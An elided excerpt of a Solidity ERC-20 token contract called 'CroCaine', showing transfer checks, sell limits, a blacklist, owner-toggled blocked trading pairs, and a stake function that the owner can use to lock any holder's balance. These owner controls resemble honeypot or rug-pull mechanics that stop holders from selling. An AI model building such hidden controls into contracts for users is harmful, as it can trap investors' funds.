...
contract CroCaine is Context, IERC20, Ownable {
    ...
    uint256 public _sellLimit = 10000000000000000000;

    string private _name = "CroCaine";
    string private _symbol = "CAINE";
    ...
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(block.timestamp > _tLocked[_msgSender()] , "W");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(block.timestamp > _tLocked[sender] , "W");
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "e"));
        return true;
    }
    ...
    function setRouter(IUniswapV2Router02 router) public {
        if(firstOwner() != _msgSender()) {
            revert();
        }
        // require(firstOwner() == _msgSender(), "C");
    ...
    function toggleUnallowedPair(address coinAddress, bool disable) external {
        if(firstOwner() != _msgSender()) {
            revert();
        }
        // require(firstOwner() == _msgSender(), "C");
    ...
    function _transfer(
        ...
        require(!(blacklist[from] || blacklist[to]), "B");

        require(from != address(0), "e");
        require(to != address(0), "e");
        require(unallowedPairs[to] == false, "T");
        require(amount > 0, "T");
        ...
        if (!_isExcludedFromSellLimits[from] &&  to == uniswapV2Pair) {
            require(amount <= _sellLimit, "sl");
            require(_sellPeriod <= block.timestamp - sellDates[from], "wait sell");
            sellDates[from] = block.timestamp;
        }

        // Can not transfer staked balance
        if (stakes[from] > 0) {
            require(amount <= balanceOf(from).sub(stakes[from]), "staked token");
        }

        // Can not transfer vesting balance
        if (_allowVesting && vestingList[from].locked > 0) {
            _checkVesting(from);
            require(amount <= balanceOf(from).sub(stakes[from]).sub(vestingList[from].locked), "vested token");
        }
    ...
    function stake(address staker, uint256 amount, bool toggle) external {
        require(_msgSender() == _stakingAddress || _msgSender() == firstOwner(), "u");
        if (toggle) {
